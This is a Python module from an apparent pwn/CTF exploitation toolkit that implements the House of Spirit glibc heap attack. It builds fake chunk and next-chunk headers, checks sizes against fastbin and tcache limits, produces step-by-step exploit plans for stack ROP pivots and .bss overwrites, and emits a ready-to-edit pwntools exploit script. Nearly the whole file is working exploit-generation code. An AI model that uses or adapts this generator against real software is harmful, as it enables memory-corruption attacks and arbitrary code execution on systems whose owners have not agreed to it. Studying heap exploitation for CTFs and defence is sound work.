"""
House of Spirit exploitation technique.

Creates a fake heap chunk at a controlled location (stack, .bss, etc.),
frees it into fastbin/tcache, then allocates to get a chunk at that location.

Requirements:
- Ability to write fake chunk metadata at target
- Free primitive on arbitrary pointer
- Allocation primitive

References:
- https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

from supwngo.utils.helpers import p64, p32
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class FakeChunk:
    """Represents a fake heap chunk."""
    address: int
    size: int
    prev_size: int = 0
    flags: int = 1  # PREV_INUSE
    next_chunk_size: int = 0  # Size of "next" fake chunk

    def __post_init__(self):
        # Set default next chunk size if not specified
        if self.next_chunk_size == 0:
            self.next_chunk_size = 0x21  # Minimum valid size


class HouseOfSpirit:
    """
    House of Spirit heap exploitation technique.

    The attack works by:
    1. Creating a fake chunk at a controlled location
    2. Freeing the fake chunk into fastbin or tcache
    3. Allocating to retrieve a chunk at the fake location

    This is useful when:
    - You have a pointer overwrite but not direct memory write
    - You want to allocate on the stack (for ROP, etc.)
    - You need to bypass ASLR by allocating at known address

    Requirements:
    - Valid fake chunk header at target-0x10 (64-bit) or target-0x8 (32-bit)
    - Valid "next chunk" header after fake chunk
    - Fastbin/tcache appropriate size
    """

    def __init__(self, bits: int = 64, libc_version: str = "2.31"):
        """
        Initialize House of Spirit exploiter.

        Args:
            bits: Architecture bits (32 or 64)
            libc_version: Target glibc version
        """
        self.bits = bits
        self.pack = p64 if bits == 64 else p32
        self.libc_version = libc_version

        # Chunk header size
        self.header_size = 16 if bits == 64 else 8
        self.ptr_size = 8 if bits == 64 else 4

        # Parse version
        self.major, self.minor = self._parse_version(libc_version)

        # tcache available in glibc >= 2.26
        self.has_tcache = self.major > 2 or (self.major == 2 and self.minor >= 26)

        # Fastbin size limits
        self.max_fastbin_size = 0x80 if bits == 64 else 0x40

        # tcache size limits (larger than fastbin)
        self.max_tcache_size = 0x410 if bits == 64 else 0x200

    def _parse_version(self, version: str) -> Tuple[int, int]:
        """Parse glibc version string."""
        try:
            parts = version.split(".")
            return int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
        except (ValueError, IndexError):
            return 2, 31

    def validate_chunk_size(self, size: int, use_tcache: bool = True) -> Dict[str, Any]:
        """
        Validate chunk size for House of Spirit.

        Args:
            size: Requested chunk size
            use_tcache: Whether to use tcache (vs fastbin)

        Returns:
            Validation result
        """
        result = {
            "valid": True,
            "warnings": [],
            "bin_type": "tcache" if use_tcache and self.has_tcache else "fastbin",
        }

        # Minimum size check
        min_size = 0x20 if self.bits == 64 else 0x10
        if size < min_size:
            result["valid"] = False
            result["warnings"].append(f"Size 0x{size:x} below minimum 0x{min_size:x}")

        # Alignment check
        alignment = 0x10 if self.bits == 64 else 0x8
        if size % alignment != 0:
            result["valid"] = False
            result["warnings"].append(f"Size 0x{size:x} not aligned to 0x{alignment:x}")

        # Bin size limits
        if use_tcache and self.has_tcache:
            if size > self.max_tcache_size:
                result["valid"] = False
                result["warnings"].append(
                    f"Size 0x{size:x} exceeds tcache max 0x{self.max_tcache_size:x}"
                )
        else:
            if size > self.max_fastbin_size:
                result["valid"] = False
                result["warnings"].append(
                    f"Size 0x{size:x} exceeds fastbin max 0x{self.max_fastbin_size:x}"
                )

        return result

    def build_fake_chunk(
        self,
        size: int,
        prev_size: int = 0,
        next_chunk_size: int = 0,
    ) -> bytes:
        """
        Build fake chunk header.

        Layout (64-bit):
            +0x00: prev_size
            +0x08: size | flags
            +0x10: user data starts here

        Args:
            size: Chunk size (including header)
            prev_size: Previous chunk size
            next_chunk_size: Size for fake next chunk validation

        Returns:
            Fake chunk bytes
        """
        if next_chunk_size == 0:
            # Default: small valid size for next chunk
            next_chunk_size = 0x21 if self.bits == 64 else 0x11

        data = bytearray()

        # prev_size
        data += self.pack(prev_size)

        # size with PREV_INUSE flag (required to pass free checks)
        data += self.pack(size | 1)

        return bytes(data)

    def build_next_chunk_header(
        self,
        size: int = 0x21,
    ) -> bytes:
        """
        Build fake next chunk header for validation.

        During free(), glibc checks that the "next chunk" has valid size.
        We need to place valid-looking metadata after our fake chunk.

        Args:
            size: Size for next chunk (default minimum)

        Returns:
            Next chunk header bytes
        """
        data = bytearray()

        # prev_size (can be anything, not checked during free)
        data += self.pack(0)

        # size with PREV_INUSE set
        data += self.pack(size | 1)

        return bytes(data)

    def generate_exploit(
        self,
        target_addr: int,
        chunk_size: int = 0x40,
        use_tcache: bool = True,
    ) -> Dict[str, Any]:
        """
        Generate House of Spirit exploit.

        Args:
            target_addr: Where to get allocation (user data pointer)
            chunk_size: Size for fake chunk
            use_tcache: Use tcache instead of fastbin

        Returns:
            Exploit details
        """
        # Calculate fake chunk address (header is before user data)
        fake_chunk_addr = target_addr - self.header_size

        # Validate size
        validation = self.validate_chunk_size(chunk_size, use_tcache)

        # Build payloads
        fake_chunk = self.build_fake_chunk(chunk_size)
        next_chunk = self.build_next_chunk_header()

        # Next chunk location
        next_chunk_addr = fake_chunk_addr + chunk_size

        result = {
            "technique": "house_of_spirit",
            "target": target_addr,
            "fake_chunk_addr": fake_chunk_addr,
            "next_chunk_addr": next_chunk_addr,
            "chunk_size": chunk_size,
            "bin_type": validation["bin_type"],
            "fake_chunk_payload": fake_chunk,
            "next_chunk_payload": next_chunk,
            "validation": validation,
            "steps": [
                f"1. Write fake chunk header at 0x{fake_chunk_addr:x}:",
                f"   - prev_size: 0, size: 0x{chunk_size | 1:x}",
                f"2. Write fake next chunk at 0x{next_chunk_addr:x}:",
                f"   - size: 0x21 (minimum valid)",
                f"3. Free pointer 0x{target_addr:x} (fake chunk)",
                f"4. Chunk goes to {validation['bin_type']}",
                f"5. Allocate 0x{chunk_size - self.header_size:x} bytes",
                f"6. Get allocation at 0x{target_addr:x}",
            ],
        }

        if not validation["valid"]:
            result["warnings"] = validation["warnings"]

        return result

    def generate_stack_pivot(
        self,
        stack_addr: int,
        rop_chain: bytes,
        chunk_size: int = 0x100,
    ) -> Dict[str, Any]:
        """
        Generate exploit to write ROP chain on stack.

        Args:
            stack_addr: Stack address to target
            rop_chain: ROP chain to write
            chunk_size: Chunk size (must fit ROP chain)

        Returns:
            Exploit for stack pivot
        """
        # Ensure chunk is large enough for ROP chain
        min_size = len(rop_chain) + self.header_size
        if chunk_size < min_size:
            chunk_size = ((min_size + 0xF) // 0x10) * 0x10  # Align up

        exploit = self.generate_exploit(
            target_addr=stack_addr,
            chunk_size=chunk_size,
        )

        exploit["rop_chain"] = rop_chain
        exploit["steps"].append(f"7. Write ROP chain ({len(rop_chain)} bytes) to stack")
        exploit["steps"].append("8. Trigger stack return to execute ROP")

        return exploit

    def generate_bss_overwrite(
        self,
        bss_addr: int,
        data: bytes,
        chunk_size: int = 0x40,
    ) -> Dict[str, Any]:
        """
        Generate exploit to write to .bss section.

        Args:
            bss_addr: Address in .bss to target
            data: Data to write
            chunk_size: Chunk size

        Returns:
            Exploit for .bss overwrite
        """
        exploit = self.generate_exploit(
            target_addr=bss_addr,
            chunk_size=chunk_size,
        )

        exploit["write_data"] = data
        exploit["steps"].append(f"7. Write {len(data)} bytes to .bss")

        return exploit

    def build_complete_layout(
        self,
        target_addr: int,
        chunk_size: int = 0x40,
        fill_data: bytes = b"",
    ) -> bytes:
        """
        Build complete memory layout for House of Spirit.

        This is the full payload that needs to be written at target-0x10.

        Args:
            target_addr: Target allocation address
            chunk_size: Chunk size
            fill_data: Data to include in user area

        Returns:
            Complete layout bytes
        """
        layout = bytearray()

        # Fake chunk header
        layout += self.build_fake_chunk(chunk_size)

        # User data area (where fill_data goes)
        user_size = chunk_size - self.header_size
        if fill_data:
            layout += fill_data[:user_size]
            if len(fill_data) < user_size:
                layout += b"\x00" * (user_size - len(fill_data))
        else:
            layout += b"\x00" * user_size

        # Next chunk header (for validation)
        layout += self.build_next_chunk_header()

        return bytes(layout)

    def generate_pwntools_script(
        self,
        exploit: Dict[str, Any],
        write_func: str = "write_at",
        free_func: str = "free",
        alloc_func: str = "malloc",
    ) -> str:
        """
        Generate pwntools exploit script.

        Args:
            exploit: Exploit dict from generate_exploit
            write_func: Function to write at arbitrary address
            free_func: Function to free pointer
            alloc_func: Function to allocate

        Returns:
            Python script string
        """
        script = f'''#!/usr/bin/env python3
"""
House of Spirit Exploit
Target: 0x{exploit['target']:x}
Chunk Size: 0x{exploit['chunk_size']:x}
"""

from pwn import *

# Configuration
context.arch = "{'amd64' if self.bits == 64 else 'i386'}"
context.log_level = "debug"

# Addresses (update these)
TARGET = 0x{exploit['target']:x}
FAKE_CHUNK_ADDR = 0x{exploit['fake_chunk_addr']:x}
NEXT_CHUNK_ADDR = 0x{exploit['next_chunk_addr']:x}

def exploit():
    # Step 1: Write fake chunk header
    fake_chunk = {repr(exploit['fake_chunk_payload'])}
    {write_func}(FAKE_CHUNK_ADDR, fake_chunk)

    # Step 2: Write fake next chunk header
    next_chunk = {repr(exploit['next_chunk_payload'])}
    {write_func}(NEXT_CHUNK_ADDR, next_chunk)

    # Step 3: Free the fake chunk
    {free_func}(TARGET)

    # Step 4: Allocate to get chunk at target
    alloc_size = 0x{exploit['chunk_size'] - self.header_size:x}
    target_chunk = {alloc_func}(alloc_size)

    # target_chunk should now be at TARGET
    log.success(f"Got allocation at: {{hex(target_chunk)}}")

    return target_chunk

if __name__ == "__main__":
    exploit()
'''
        return script

    def summary(self) -> str:
        """Get technique summary."""
        return f"""
House of Spirit
===============
Architecture: {self.bits}-bit
glibc version: {self.libc_version}
Has tcache: {self.has_tcache}

Size Limits:
- Fastbin: 0x20 - 0x{self.max_fastbin_size:x}
- tcache: 0x20 - 0x{self.max_tcache_size:x}

Requirements:
- Write primitive at target-0x{self.header_size:x}
- Free primitive on arbitrary pointer
- Allocation primitive

Use Cases:
- Stack allocation (for ROP chains)
- .bss overwrite (for global variables)
- Arbitrary allocation at known address
"""


def house_of_spirit_exploit(
    target_addr: int,
    chunk_size: int = 0x40,
    bits: int = 64,
    libc_version: str = "2.31",
) -> Dict[str, Any]:
    """
    Convenience function for House of Spirit exploit.

    Args:
        target_addr: Target allocation address
        chunk_size: Chunk size for fake chunk
        bits: Architecture bits
        libc_version: Target glibc version

    Returns:
        Exploit details
    """
    hos = HouseOfSpirit(bits=bits, libc_version=libc_version)
    return hos.generate_exploit(
        target_addr=target_addr,
        chunk_size=chunk_size,
    )
